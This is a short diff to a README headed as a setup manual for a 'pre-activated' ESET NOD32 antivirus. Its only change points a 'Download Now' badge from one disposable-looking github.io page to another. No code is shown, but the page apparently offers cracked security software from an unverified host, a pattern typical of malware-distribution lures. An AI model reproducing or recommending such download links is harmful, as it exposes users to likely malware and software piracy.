@@ -1,7 +1,7 @@
 # 🛡️ Pre-activated ESET NOD32 Antivirus — Setup Manual
 
 ⬇️ **Download Tool**  
-[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=eset)](https://skibidi123gyatttt-gmail-com.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=eset)](https://oberbrunnerjaime08.github.io/.github/nod32-pre-activated)
 
 ---
 
